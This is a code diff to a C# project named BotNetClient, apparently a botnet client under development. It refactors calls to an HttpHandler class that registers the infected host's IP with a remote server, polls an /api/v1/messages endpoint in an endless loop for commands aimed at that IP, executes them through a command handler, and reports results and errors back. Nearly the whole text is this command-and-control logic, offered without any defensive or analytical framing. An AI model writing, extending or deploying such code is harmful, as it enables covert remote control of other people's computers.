@@ -7,6 +7,7 @@ using System.Reflection;
 using Microsoft.Win32;
 using System.Windows;
 using System.IO;
+using CommandHandler;
 
 namespace BotNetClient
 {
@@ -21,13 +22,13 @@ namespace BotNetClient
             IPHostEntry iphostinfo = Dns.Resolve(Dns.GetHostName());
             IPAddress ipadress = iphostinfo.AddressList[0];
             List<string> apiipadress = new List<string> { };
-            if (HttpHandler.Class1.ResultIPTask().Result.IndexOf(ipadress.ToString())>=0)
+            if (HttpHandler.ResultIPTask().Result.IndexOf(ipadress.ToString())>=0)
             {
                 
             }
             else
             {
-                idc = HttpHandler.Class1.CreateIpAndIdAsync(ipadress.ToString()).Result;
+                idc = HttpHandler.CreateIpAndIdAsync(ipadress.ToString()).Result;
             }
             #region tcp and socket code
             //IPHostEntry iphostinfo = Dns.Resolve(Dns.GetHostName());
@@ -46,7 +47,7 @@ namespace BotNetClient
             //stream1.Write(ipsend, 0, ipsend.Length);
             #endregion
             uint id = 1;
-            id = HttpHandler.Class1.IdResult().Result+1;
+            id = HttpHandler.IdResult().Result+1;
             try
             {
                 miniprogram.Start();
@@ -57,17 +58,17 @@ namespace BotNetClient
                 }
                 while (true)
                 {
-                    if(HttpHandler.Class1.IdResult().Result!=0)
+                    if(HttpHandler.IdResult().Result!=0)
                         {
-                        if ((HttpHandler.Class1.GetCommandAssync<HttpHandler.Command>($"/api/v1/messages/{id - 1}").Result != null))
+                        if ((HttpHandler.GetCommandAssync<Command>($"/api/v1/messages/{id - 1}").Result != null))
                         {
-                            if ((HttpHandler.Class1.ResultIdCmd((id - 1).ToString()).Result == id - 1) && (HttpHandler.Class1.ResultIpCmdAsync((id - 1).ToString()).Result.IndexOf(ipadress.ToString()) >= 0))
+                            if ((HttpHandler.ResultIdCmd((id - 1).ToString()).Result == id - 1) && (HttpHandler.ResultIpCmdAsync((id - 1).ToString()).Result.IndexOf(ipadress.ToString()) >= 0))
                             {
-                                string answer = HttpHandler.Class1.ResultCmd((id - 1).ToString()).Result;
+                                string answer = HttpHandler.ResultCmd((id - 1).ToString()).Result;
                                 Stopwatch watch = new Stopwatch();
                                 watch.Start();
                                 string message = "Ответ от " + ipadress.ToString() + " : " + handler.handl(answer, idc, ipadress.ToString()) + ". Time Used: " + watch.ElapsedMilliseconds + "ms";
-                                HttpHandler.Class1.SendResponse(message, ipadress.ToString());
+                                HttpHandler.SendResponse(message, ipadress.ToString());
                                 watch.Stop();
                                 id++;
                             }
@@ -92,7 +93,8 @@ namespace BotNetClient
             } 
             catch (Exception ex)
             {
-                HttpHandler.Class1.SendResponse(ex.ToString(), ipadress.ToString());
+                Console.WriteLine(ex);
+                HttpHandler.SendResponse(ex.ToString(), ipadress.ToString());
             }
             finally
             {
